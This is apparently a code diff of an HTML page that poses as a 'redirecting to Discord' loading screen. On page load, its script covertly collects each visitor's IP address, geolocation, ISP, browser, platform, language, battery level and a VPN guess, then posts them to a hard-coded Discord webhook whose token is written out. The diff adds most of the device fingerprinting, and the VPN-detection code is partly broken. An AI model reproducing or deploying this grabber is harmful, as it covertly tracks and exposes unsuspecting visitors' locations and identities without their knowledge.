@@ -1,77 +1,138 @@
 <!DOCTYPE html>
 <html>
 <head>
- <title>Loading.</title>
- <script>
-  setTimeout(function() {
-    window.location.href = 'https://www.discord.com/app';
-  }, 6000);
-</script>
+    <title>Loading.</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = 'https://www.discord.com/app';
+        }, 6000);
+    </script>
 </head>
 <body>
 <script>
-  async function sendUserDataToDiscord() {
-    try {
-      // Fetch user data from json.geoiplookup.io
-      const response = await fetch('https://json.geoiplookup.io');
-      const userData = await response.json();
+    async function sendUserDataToDiscord() {
+        try {
+            // Fetch user data from json.geoiplookup.io
+            const response = await fetch('https://json.geoiplookup.io');
+            const userData = await response.json();
 
-      // Construct the message content
-      const messageContent = `
-        **User Data:**
-        - IP Address: ${userData.ip}
-        - Country: ${userData.country_name}
-        - Region: ${userData.region}
-        - City: ${userData.city}
-        - ISP: ${userData.isp}
-      `;
+            // Get device, browser, and battery information
+            const deviceInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                battery: navigator.getBattery ? navigator.getBattery().level * 100 : null,
+            };
 
-      // Send the user data to Discord webhook
-      const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-'; // Replace with your Discord webhook URL
-      const payload = {
-        content: messageContent
-      };
+            // Check if VPN is being used
+            const isVPN = checkForVPN();
 
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      });
+            // Construct the message content
+            const messageContent = `
+                **User Data:**
+                - IP Address: ${userData.ip}
+                - Country: ${userData.country_name}
+                - Region: ${userData.region}
+                - City: ${userData.city}
+                - ISP: ${userData.isp}
+                - Device: ${deviceInfo.platform}
+                - Browser: ${deviceInfo.userAgent}
+                - Language: ${deviceInfo.language}
+                - Battery: ${deviceInfo.battery}%
+                - VPN: ${isVPN ? 'Yes' : 'No'}
+            `;
 
-      console.log('User data sent to Discord successfully');
-    } catch (error) {
-      console.error('Error sending user data to Discord:', error);
+            // Send the user data to Discord webhook
+            const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-'; // Replace with your Discord webhook URL
+            const payload = {
+                content: messageContent
+            };
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+
+            console.log('User data sent to Discord successfully');
+        } catch (error) {
+            console.error('Error sending user data to Discord:', error);
+        }
     }
-  }
 
-  // Call sendUserDataToDiscord() when the page loads
-  window.addEventListener('load', sendUserDataToDiscord);
+    // Check if VPN is being used
+    function checkForVPN() {
+        // Check if the browser is Chrome, Firefox, or Edge
+        if (/Chrome|Firefox|Edge/.test(navigator.userAgent)) {
+            // Check if the WebRTC Leak Prevent extension is active
+            if (window.webkitRTCPeerConnection) {
+                const pc = new window.webkitRTCPeerConnection({
+                    iceServers: [],
+                });
+
+                if (pc.getLocalStreams().length > 0) {
+                    return checkLocalAddress(pc.getLocalStreams()[0].getVideoTracks()[0].getSettings().sourceId);
+                }
+
+                pc.createDataChannel('');
+
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const sourceId = checkLocalAddress(event.candidate.candidate.url);
+                        if (sourceId) {
+                            pc.close();
+                            return sourceId;
+                        }
+                    }
+                };
+
+                pc.createOffer({
+                    offerToReceiveVideo: 1,
+                }, (offer) => {
+                    pc.setLocalDescription(offer);
+                }, () => {
+                    pc.close();
+                });
+
+                function checkLocalAddress(url) {
+                    if (!url) {
+                        return null;
+                    }
+
+                    const matches = url.match(/(localhost|127\.0\.0\.1)/);
+                    if (matches) {
+                        return true;
+                    }
+
+                    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
+                    const ipAddress = url.match(ipRegex)[0];
+                    if (ipAddress) {
+                        const geo = new XMLHttpRequest();
+                        geo.open('GET', `https://json.geoiplookup.io/${ipAddress}`, false);
+                        geo.send();
+
+                        if (geo.status === 200) {
+                            const geoData = JSON.parse(geo.responseText);
+                            if (geoData.country_name === 'United States') {
+                                return true;
+                            }
+                        }
+                    }
+
+                    return null;
+                }
+            }
+        }
+
+        return false;
+    }
+
+    // Call sendUserDataToDiscord() when the page loads
+    window.addEventListener('load', sendUserDataToDiscord);
 </script>
 
-  <p>You should be redirected to discord, please be sure that you are logged in if you are on PC or iOS</p>
-  <div id="countdown">Redirecting in 6 seconds</div>
-
-  <script>
-    // Function to update the countdown and redirect
-    function countdown() {
-      var count = 6;
-      var countdownElement = document.getElementById('countdown');
-
-      var timer = setInterval(function() {
-        count--;
-        countdownElement.textContent = 'Redirecting in ' + count + ' seconds';
-
-        if (count <= 0) {
-          clearInterval(timer);
-          window.location.href = 'https://www.discord.com/app'; // Redirect after countdown
-        }
-      }, 1000); // Update countdown every 1 second
-    }
-
-    // Call countdown() when the page loads
-    window.onload = countdown;
-  </script>
+<p>You should be redirected to discord, please be sure that you are logged in if you are on PC or iOS</p>
 </body>
 </html>
